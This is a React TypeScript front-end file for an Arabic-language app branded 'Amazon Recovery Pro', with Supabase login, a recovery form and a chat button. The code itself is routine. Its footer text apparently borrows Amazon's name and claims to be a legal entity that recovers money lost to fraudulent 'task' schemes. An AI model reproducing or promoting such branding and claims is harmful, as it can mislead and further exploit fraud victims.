
import React, { useState, useEffect } from 'react';
import Header from './components/Header.tsx';
import RecoveryForm from './components/RecoveryForm.tsx';
import LiveStatus from './components/LiveStatus.tsx';
import BottomNav from './components/BottomNav.tsx';
import Auth from './components/Auth.tsx';
import { supabase } from './lib/supabase.ts';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState('Home');
  const [session, setSession] = useState<any>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const checkSession = async () => {
      try {
        // Safe destructuring to handle potential null data
        const { data } = await supabase.auth.getSession();
        setSession(data?.session || null);
      } catch (err) {
        console.error('Supabase auth error:', err);
        setSession(null);
      } finally {
        setLoading(false);
      }
    };

    checkSession();

    // Listen for auth changes
    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session);
    });

    return () => subscription.unsubscribe();
  }, []);

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9]">
        <div className="w-12 h-12 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  if (!session) {
    return <Auth />;
  }

  return (
    <div className="flex flex-col min-h-screen max-w-[430px] mx-auto bg-[#F4F7F9] relative pb-24">
      <Header />
      
      <main className="flex-1 px-4 py-2">
        <LiveStatus />
        
        <div className="mt-2">
           <div className="flex items-center gap-2 mb-3 px-1">
              <div className="w-1.5 h-6 bg-[#9B4A4E] rounded-full"></div>
              <h3 className="text-gray-800 font-bold text-lg text-right w-full">مركز إيقاف المهام ومعالجة الشكاوي</h3>
           </div>
           <RecoveryForm />
        </div>

        <div className="mt-6 px-4 text-center">
          <p className="text-[10px] text-gray-400 font-medium leading-relaxed">
            Amazon Recovery Pro هي جهة قانونية تقنية مختصة حصرياً في إيقاف المهام الاحتيالية وتصحيح مسار السجلات المالية ورفع الشكاوي للجهات المختصة لاستعادة رصيدك العالق.
          </p>
        </div>
      </main>

      <div className="fixed bottom-24 right-6 z-50">
        <button className="bg-[#9B4A4E] text-white p-4 rounded-full shadow-2xl animate-bounce flex items-center justify-center border-4 border-white active:scale-90 transition-transform">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
        </button>
      </div>

      <BottomNav activeTab={activeTab} onTabChange={setActiveTab} />
    </div>
  );
};

export default App;
